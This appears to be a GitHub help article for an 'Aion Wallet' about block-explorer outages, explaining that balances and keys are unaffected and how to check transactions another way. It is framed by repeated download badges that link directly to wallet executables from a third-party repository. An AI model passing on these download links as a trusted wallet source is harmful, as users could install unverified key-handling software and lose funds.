![Aion Wallet](assets/banner-article.png)

# Aion explorer down: what still works

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

When an Aion explorer or dashboard is unavailable, your wallet and your keys keep working, and a confirmed transaction stays confirmed: the explorer is a viewer over the chain, not a part of it.

That distinction decides how to respond. An explorer outage is a wait, not a repair job, and nothing about your balance depends on the site being reachable while you check it.

## You'll see this if

- The explorer returns an error page, a gateway timeout or a blank screen.
- A block height on the site has stopped moving.
- The wallet shows a recent transaction that the explorer does not list.
- You are trying to confirm a transfer and the only tool you know is unavailable.

## What an explorer is

An explorer is a web application that reads a node and renders blocks, transactions and account balances. It has its own infrastructure, its own availability and its own caching, and none of that is shared with your wallet's connection unless the two happen to use the same endpoint.

That is why the wallet and the site can disagree. They are two readers looking at the same chain, and either can be stale while the other is current.

## What you can still do

The wallet opens, because the keys and addresses are local. The receive screen shows your address. Sending is possible if the wallet can reach a node, which is a separate question from whether a particular website is up.

A transaction hash is portable. If one explorer is down, the same hash can be looked up on another, or checked through a node's API if you run one. The [Aion wallet transaction history](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-transaction-history.md) guide covers confirming a transfer without relying on a single site.

Staking positions are readable from the wallet when it is connected, and delegation changes are transactions with hashes like any other.

## What you cannot do

You cannot verify a balance from the explorer while it is down. That is the whole loss, and it is temporary.

You also cannot conclude that funds are missing because an explorer does not show them. An explorer with a stale index will show an old balance for a correct address, and the wallet may well be right.

## The checks worth running

1. Try the site again after a few minutes, then after an hour. Gateway errors are often transient and regional.
2. Check a second independent service if one exists for the network, because two failures are a stronger signal than one.
3. Look at the wallet's own connection status. If the wallet is synced and shows a balance, the chain is being read successfully from somewhere.
4. Confirm the address is the one you expect before drawing any conclusion about the number.

If the wallet is also failing, the problem is more likely to be your connection or the endpoint both tools use, and the [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) guide walks through that.

## Running your own view

The reliable answer to a public explorer outage is to read the chain yourself. A node on your own machine serves the same data locally, and the [how to run an Aion node](https://github.com/aion-wallet/aion-staking/blob/main/how-to-run-aion-node.md) guide covers the software, the disk requirement and the ports.

That is more work than most holders need for a single balance check, and it is the right answer for anyone who stakes or runs a pool and needs the data to be present.

A region-specific block is worth considering before concluding that a service is down: a site reachable on one network and not another is a routing problem rather than an outage.

If you decide to stop depending on public services, the first step is knowing which identifiers your own node will answer for. The [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) guide lists them before you commit to the setup.

## Prevention

Do not depend on one site for a balance you care about. Keep the address written down, keep the wallet installed and updated, and know at least one alternative way to look up a transaction hash.

Save transaction hashes when you send. They are the record that survives any website outage and any reinstall.

Treat any message that arrives during an outage as suspect. A period when a familiar site is down is exactly when lookalike pages and "support" messages appear.

## Frequently asked questions

### Can an explorer outage affect my balance?

No. The chain holds the balance; the explorer only displays it.

### Is my transaction lost if the explorer does not show it?

A confirmed transaction is in a block. If one reader cannot see it, try another, or check from a node.

### Why does the wallet show a different balance than the site?

They are reading from different places, and one is behind. The wallet's own sync status tells you whether to trust its number.

### Should I move funds while an explorer is down?

You can, but confirming the result is harder. If the transfer is not urgent, waiting avoids sending twice.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) - when the problem is your connection rather than the site.
- [Aion wallet transaction history](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-transaction-history.md) - confirming a transfer without an explorer.
- [How to run an Aion node](https://github.com/aion-wallet/aion-staking/blob/main/how-to-run-aion-node.md) - reading the chain yourself.
- [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) - the identifiers a node or wallet needs.
